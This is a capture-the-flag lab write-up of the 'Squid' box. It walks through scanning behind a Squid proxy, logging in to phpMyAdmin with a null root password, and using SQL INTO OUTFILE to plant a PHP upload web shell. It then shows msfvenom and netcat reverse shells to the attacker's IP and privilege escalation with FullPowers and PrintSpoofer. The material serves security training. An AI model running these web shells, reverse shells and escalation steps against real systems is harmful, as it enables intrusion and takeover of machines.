---
description: 09-14-22
---

# Squid (Easy)

### Improved skills

* Skill 1
* Skill 2

### Used tools

* Nmap -- NmapAutomator.sh

## Information Gathering

Scanned all TCP ports:

```
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-server-header: squid/4.14
```

Enumerated UDP ports:

```
```

Notes:

Why is it taking so long to scan this host? Why are we barely getting any information back?

* <mark style="color:yellow;">We were in front of a proxy that's why</mark>

### Squid Proxy Research

Squid is a caching and forwarding HTTP web proxy. It has a ton of uses such as speeding up a web server by caching requests, caching web, DNS, and other lookups.

In other words, it can make it very difficult to see what is actually going on behind the proxy without particular configurations. Luckily, in our case, I found a tool called "spose" that allows us to detect open ports behind the proxy.

{% embed url="https://github.com/aancw/spose" %}
GitHub Repository
{% endembed %}

## Enumeration

### Port 3128 - HTTP (Squid 4.14)

Visual Inspection

<figure><img src="../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### Version Number Exploit Enumeration

* Nothing came back for <mark style="color:red;">Searchsploit</mark>
* Google provided me a lot more results
  * However, this was a rabbit hole

### "Spose"

Syntax

```
python3 spose.py --proxy http://192.168.75.189:3128/ --target 192.168.75.189                                                                                  Wed 14 Sep 2022 04:53:28 AM EDT

Using proxy address http://192.168.75.189:3128/
192.168.75.189 3306 seems OPEN 
192.168.75.189 8080 seems OPEN
```

* We see that by using the proxy port scanner, we get 2 additional ports open that we can detect
* This is great, however, we still do not have a way of natively visiting these ports

### Proxy Foxy

By adding the following configuration to Proxy Foxy, we can navigate to the 8080 port

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption><p>Proxy Foxy Configuration</p></figcaption></figure>

### Port 8080 - HTTP Wampserver&#x20;

<figure><img src="../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption><p>Wampserver</p></figcaption></figure>

* After adding the proxy configuration, we are able to navigate to the site

### Dirsearch (Behind Proxy)

```
dirsearch --proxy http://192.168.75.189:3128 -u 192.168.75.189:8080                                                                                     156ms  Wed 14 Sep 2022 05:03:43 AM EDT

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                  
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                           
                                                                                                                                                                                                                  
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/8080_22-09-14_05-03-55.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-22-09-14_05-03-55.log

Target: http://192.168.75.189:8080/

[05:03:55] Starting: 
[05:03:57] 403 -  291B  - /%C0%AE%C0%AE%C0%AF                              
[05:03:57] 403 -  291B  - /%3f/                                            
[05:03:57] 403 -  291B  - /%ff                                             
[05:04:00] 403 -  291B  - /.htaccess.orig                                  
[05:04:00] 403 -  291B  - /.htaccess.sample
[05:04:00] 403 -  291B  - /.htaccess.bak1
[05:04:00] 403 -  291B  - /.htaccess_orig
[05:04:00] 403 -  291B  - /.htaccess_extra
[05:04:00] 403 -  291B  - /.htaccess_sc
[05:04:00] 403 -  291B  - /.htaccessBAK                                    
[05:04:00] 403 -  291B  - /.htaccess.save
[05:04:00] 403 -  291B  - /.ht_wsr.txt
[05:04:00] 403 -  291B  - /.html                                           
[05:04:00] 403 -  291B  - /.htm
[05:04:00] 403 -  291B  - /.htaccessOLD
[05:04:00] 403 -  291B  - /.htaccessOLD2                                   
[05:04:00] 403 -  291B  - /.htpasswds
[05:04:00] 403 -  291B  - /.htpasswd_test
[05:04:00] 403 -  291B  - /.httr-oauth
[05:04:07] 403 -  291B  - /Trace.axd::$DATA                                 
[05:04:15] 200 -    4KB - /adminer/                                         
[05:04:20] 403 -  291B  - /cgi-bin/                                         
[05:04:21] 500 -  634B  - /cgi-bin/printenv.pl                              
[05:04:28] 200 -  198KB - /favicon.ico                                      
[05:04:30] 200 -    6KB - /index                                            
[05:04:30] 200 -    6KB - /index.php                                        
[05:04:30] 403 -  291B  - /index.php::$DATA                                 
[05:04:30] 200 -    6KB - /index.pHp                                        
[05:04:30] 200 -    6KB - /index.php/login/
[05:04:30] 200 -    6KB - /index.php.
[05:04:38] 200 -    1KB - /phpmyadmin/README                                
[05:04:38] 200 -   15KB - /phpmyadmin/doc/html/index.html                   
[05:04:38] 200 -   27KB - /phpmyadmin/ChangeLog                             
[05:04:38] 301 -  338B  - /phpmyadmin  ->  http://192.168.75.189:8080/phpmyadmin/
[05:04:39] 200 -    2KB - /phpsysinfo/                                      
[05:04:39] 200 -   15KB - /phpmyadmin/                                      
[05:04:40] 200 -   15KB - /phpmyadmin/index.php
[05:04:43] 200 -    2KB - /shell                                            
[05:04:43] 200 -    2KB - /shell.php
[05:04:43] 200 -    2KB - /shell/
```

* Notice how I had to use the -proxy flag

## Exploitation

### Weak Password/Authentication

After bypassing the proxy, we are presented with a phpmyadmin login screen that can be found at:

<mark style="color:yellow;">http://192.168.75.189:8080/phpmyadmin/</mark>

* The credentials for root are null

### PHPMyAdmin

We see that we can create databases with our new permissions and in a HTB CTF, I was able to exploit a PHPMyAdmin server by placing a reverse shell into a table.&#x20;

Can we do the same here?

1. Create a new table
2. Select "SQL" on the bar at the top
3. Place the following into it

```
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';

```

* There is now an uploaded in 192.168.75.189:8080/uploader.php

4\. Generate a payload with Msfvenom

```
msfvenom -p php/reverse_php LHOST=192.168.49.75 LPORT=443 -f raw -o shell.php
```

* The reverse shell will be saved as shell.php
* Upload the reverse shell into the uploader
* Start an rlwrap netcat listener

```
sudo rlwrap nc -lnvp 443
```

* Trigger the reverse shell

```
curl --proxy http://192.168.75.189:3128 -s http://192.168.75.189:8080/shell.php
```

<figure><img src="../../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>

### Stable Shell

Start SMB Server on Kali

```
impacket-smbserver smb . -smb2support
```

Mount Share and copy netcat binary on target

```
net use \\192.168.49.75\smb
The command completed successfully

copy \\192.168.49.75\smb\nc.exe
```

Start listener on Kali and execute reverse shell

```
sudo rlwrap nc -lnvp 80

nc.exe 192.168.49.75 80 -e cmd.exe
```

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Local enumeration

whoami /priv

```
whoami
nt authority\local service

C:\wamp\www>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

* When you are nt authority\local service, you can extract default privilege sets in order to escalate privileges
* This tool can speed up that process

{% embed url="https://github.com/itm4n/FullPowers" %}
GitHub Repository
{% endembed %}

### PrivEsc vector

```
nt authority\local service
```

This is vulnerable

Transfer the binary to the target

```
copy \\192.168.49.75\FullPowers.exe
```

Run FullPowers.exe

```
FullPowers.exe
```

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption><p>We now have SeImpersonatePrivilege</p></figcaption></figure>

* I know from experience that this is an OG priv esc method

### SeImpersonatePrivilege

{% embed url="https://github.com/dievus/printspoofer" %}
GitHub Repository
{% endembed %}

Transfer exploit to target

Execute exploit with command:

```
```

## Proofs

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
